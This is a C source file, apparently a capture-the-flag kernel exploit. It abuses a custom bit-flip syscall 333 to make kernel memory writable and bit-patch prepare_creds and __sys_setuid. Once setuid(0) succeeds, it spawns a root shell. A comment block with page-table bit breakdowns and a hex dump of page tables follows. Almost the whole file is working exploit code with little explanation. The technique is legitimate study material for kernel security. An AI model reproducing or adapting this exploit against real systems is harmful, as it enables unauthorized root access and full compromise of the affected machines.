#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
unsigned long kernel_base = 0xffffffff81000000;
unsigned long flip_count = 0xffffffff81b3b688;
unsigned long commit_creds = 0xffffffff81039d68;
unsigned long prepare_kernel_cred = 0xffffffff81039ea6;
unsigned long prepare_creds = 0xffffffff81039cab; 
unsigned long __sys_setuid = 0xffffffff81031f5e;

void patch16(long *patch_target, unsigned short old, unsigned short new) {
	unsigned short diff = old ^ new;
	for (int bit = 0; bit < 16; bit++) {
		if (diff & (1<<bit))
		        assert(syscall(333, patch_target, bit) == 0);
	}
}


int main()
{
        puts("[+] flipping off the flip_count\n");
        long *flip_count = (long *) 0xffffffff81b3b688;
        assert(syscall(333, flip_count, 63) == 0);
        printf("[+] writing writeable\n");
	assert(syscall(333, 0xffffffff81a17040, 1) == 0);

        puts("[+] patching prep_creds\n");
        patch16((long*) 0xffffffff81039cab, 0xcab, 0xea6);
        
        puts("[+] patching sys_setuid\n");
        patch16((long*) 0xFFFFFFFF81031F68, 0xf74, 0x0F85);
        puts("[+] syscalling the syscall\n");
        syscall(__sys_setuid, 0);

        puts("[+] shelling a shell\n");
        system("/bin/sh");
        return 0;
}
/*
01a17040
ffffffff81a17000: 0000000001a17000 XG-DA---W
: 00000000010001e1  ........

0xffffffff81031000
1111111111111111     111111111    111111110       000001000                000110001              000000000000
                        pml4        pml3           page table                   pte
                        511         510                  8                      49


0xffffffff81039000
1111111111111111     111111111   111111110    000001000                000111001             000000000000
                      pml4         pml3      page table                pte
                      511          510              8                      57


pwn@pwn:~/Desktop$ xxd -e -g8 -c8 -a -s 0x1a17000 -l 0x1000 cr3_dup_exploit 
01a17000: 0000000000000002  ........
01a17008: 0000000000000000  ........
*
01a17040: 00000000010001e1  ........
01a17048: 00000000012001e1  .. .....
01a17050: 00000000014001e1  ..@.....
01a17058: 0000000007861163  c.......
01a17060: 80000000018001e1  ........
01a17068: 0000000007869063  c.......
01a17070: 0000000000000000  ........
*
01a17ff8: 0000000000000000  ........



*/
